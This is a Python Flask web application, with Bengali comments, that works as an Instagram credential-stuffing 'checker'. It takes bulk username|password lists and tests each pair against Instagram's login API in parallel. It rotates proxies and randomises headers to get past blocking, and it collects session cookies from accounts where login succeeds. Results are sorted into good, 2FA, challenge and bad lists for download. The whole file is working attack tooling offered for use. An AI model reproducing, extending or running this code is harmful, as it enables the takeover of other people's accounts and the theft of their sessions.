from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import json
import time
import random
from datetime import datetime
import threading
import zipfile
from io import BytesIO
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re

app = Flask(__name__)
CORS(app)

jobs = {}

class InstagramProChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies if proxies else []
        self.current_proxy_index = 0
        
    def get_next_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    def create_session_with_proxy(self, proxy=None):
        """প্রক্সি সহ সেশন তৈরি"""
        session = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        
        return session
    
    def get_random_headers(self):
        """র‍্যান্ডম হেডার জেনারেট"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
    
    def check_account_simple(self, username, password):
        """সিম্পল চেক - ব্লক এড়ানোর জন্য"""
        try:
            proxy = self.get_next_proxy()
            session = self.create_session_with_proxy(proxy)
            headers = self.get_random_headers()
            
            # ১. প্রথমে হোমপেজে যাই
            home_response = session.get('https://www.instagram.com/', headers=headers, timeout=10)
            
            # ২. কিছুক্ষণ অপেক্ষা
            time.sleep(random.uniform(1, 3))
            
            # ৩. CSRF টোকেন নেওয়া
            csrf_token = None
            for cookie in session.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break
            
            if not csrf_token:
                # HTML থেকে CSRF টোকেন খোঁজা
                html_content = home_response.text
                csrf_match = re.search(r'csrf_token":"([^"]+)"', html_content)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
            
            if not csrf_token:
                return {
                    'status': 'error',
                    'username': username,
                    'error': 'Could not get CSRF token'
                }
            
            # ৪. লগিন হেডার
            login_headers = {
                'User-Agent': headers['User-Agent'],
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': str(random.randint(100000, 999999)),
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.instagram.com',
                'Connection': 'keep-alive',
                'Referer': 'https://www.instagram.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            }
            
            # ৫. লগিন ডাটা
            login_data = {
                'username': username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            # ৬. লগিন রিকোয়েস্ট
            login_response = session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=login_data,
                headers=login_headers,
                timeout=10,
                allow_redirects=False
            )
            
            # ৭. রেসপন্স চেক
            if login_response.status_code == 200:
                try:
                    result = login_response.json()
                    
                    if result.get('authenticated'):
                        # কুকি সংগ্রহ
                        cookies = session.cookies.get_dict()
                        cookie_parts = []
                        for key in ['sessionid', 'csrftoken', 'ds_user_id', 'rur']:
                            if key in cookies:
                                cookie_parts.append(f"{key}={cookies[key]}")
                        
                        return {
                            'status': 'good',
                            'cookie': '; '.join(cookie_parts),
                            'username': username
                        }
                    elif result.get('two_factor_required'):
                        return {'status': '2fa', 'username': username}
                    elif result.get('checkpoint_url'):
                        return {'status': 'challenge', 'username': username}
                    else:
                        return {'status': 'bad', 'username': username}
                        
                except json.JSONDecodeError:
                    # JSON না পেলে
                    return {
                        'status': 'blocked',
                        'username': username,
                        'error': 'Instagram Blocked - Try with proxy'
                    }
            else:
                return {
                    'status': 'error',
                    'username': username,
                    'error': f'HTTP {login_response.status_code}'
                }
                
        except requests.exceptions.Timeout:
            return {'status': 'timeout', 'username': username}
        except Exception as e:
            return {'status': 'error', 'username': username, 'error': str(e)[:50]}

def process_worker(cred):
    """ওয়ার্কার ফাংশন"""
    if '|' not in cred:
        return None
    username, password = cred.split('|', 1)
    checker = InstagramProChecker()
    return checker.check_account_simple(username.strip(), password.strip())

def process_batch_parallel(credentials_list, job_id, proxy_list=None):
    """প্যারালাল প্রসেসিং"""
    total = len(credentials_list)
    
    jobs[job_id]['progress'] = 0
    jobs[job_id]['status'] = 'processing'
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for cred in credentials_list:
            if '|' in cred:
                futures.append(executor.submit(process_worker, cred))
        
        completed = 0
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result(timeout=20)
                if result:
                    username = result.get('username', 'unknown')
                    
                    if result['status'] == 'good':
                        jobs[job_id]['results']['good'].append(f"{username}|{result.get('cookie', '')}")
                    elif result['status'] == '2fa':
                        jobs[job_id]['results']['2fa'].append(f"{username}|2FA_REQUIRED")
                    elif result['status'] == 'challenge':
                        jobs[job_id]['results']['challenge'].append(f"{username}|CHALLENGE_REQUIRED")
                    elif result['status'] == 'bad':
                        jobs[job_id]['results']['bad'].append(f"{username}|BAD_PASSWORD")
                    elif result['status'] == 'blocked':
                        jobs[job_id]['results']['error'].append(f"{username}|BLOCKED: {result.get('error', '')}")
                    elif result['status'] == 'timeout':
                        jobs[job_id]['results']['error'].append(f"{username}|TIMEOUT")
                    else:
                        jobs[job_id]['results']['error'].append(f"{username}|ERROR: {result.get('error', 'Unknown')}")
            except Exception as e:
                jobs[job_id]['results']['error'].append(f"unknown|ERROR: {str(e)[:50]}")
            
            completed += 1
            jobs[job_id]['progress'] = int(completed / total * 100) if total > 0 else 0
            jobs[job_id]['details'] = {
                'good': len(jobs[job_id]['results']['good']),
                '2fa': len(jobs[job_id]['results']['2fa']),
                'challenge': len(jobs[job_id]['results']['challenge']),
                'bad': len(jobs[job_id]['results']['bad']),
                'error': len(jobs[job_id]['results']['error'])
            }
    
    jobs[job_id]['status'] = 'completed'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        credentials = data.get('credentials', '').strip().split('\n')
        credentials = [c.strip() for c in credentials if c.strip()]
        
        proxy_input = data.get('proxies', '').strip()
        proxy_list = []
        if proxy_input:
            proxy_list = [p.strip() for p in proxy_input.split('\n') if p.strip() and not p.startswith('#')]
        
        if not credentials:
            return jsonify({'error': 'কোনো ডাটা দেওয়া হয়নি'}), 400
        
        job_id = datetime.now().strftime("%Y%m%d%H%M%S")
        jobs[job_id] = {
            'status': 'pending',
            'progress': 0,
            'results': {'good': [], '2fa': [], 'challenge': [], 'bad': [], 'error': []},
            'details': {},
            'total': len(credentials),
            'proxy_count': len(proxy_list)
        }
        
        thread = threading.Thread(target=process_batch_parallel, args=(credentials, job_id, proxy_list))
        thread.daemon = True
        thread.start()
        
        return jsonify({'job_id': job_id, 'proxy_count': len(proxy_list)})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/status/<job_id>')
def status(job_id):
    if job_id not in jobs:
        return jsonify({'error': 'Job not found'}), 404
    return jsonify({
        'status': jobs[job_id]['status'],
        'progress': jobs[job_id]['progress'],
        'details': jobs[job_id].get('details', {}),
        'total': jobs[job_id]['total']
    })

@app.route('/api/download/<job_id>/<type>')
def download(job_id, type):
    try:
        if job_id not in jobs:
            return jsonify({'error': 'Job not found'}), 404
        
        if type == 'all':
            memory_file = BytesIO()
            with zipfile.ZipFile(memory_file, 'w') as zf:
                for category in ['good', '2fa', 'challenge', 'bad', 'error']:
                    results = jobs[job_id]['results'][category]
                    if results:
                        content = '\n'.join(results)
                        zf.writestr(f"{category}_accounts.txt", content)
                
                report = f"""Instagram Checker Report
Job ID: {job_id}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total: {jobs[job_id]['total']}
Proxies: {jobs[job_id]['proxy_count']}

Results:
✅ Good: {len(jobs[job_id]['results']['good'])}
🔐 2FA: {len(jobs[job_id]['results']['2fa'])}
⚠️ Challenge: {len(jobs[job_id]['results']['challenge'])}
❌ Bad: {len(jobs[job_id]['results']['bad'])}
❗ Errors: {len(jobs[job_id]['results']['error'])}
"""
                zf.writestr("report.txt", report)
            
            memory_file.seek(0)
            return send_file(memory_file, download_name=f'all_results_{job_id}.zip', as_attachment=True)
        
        else:
            results = jobs[job_id]['results'][type]
            if not results:
                return jsonify({'error': 'No results'}), 404
            content = '\n'.join(results)
            return send_file(
                BytesIO(content.encode('utf-8')),
                download_name=f'{type}_{job_id}.txt',
                as_attachment=True
            )
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
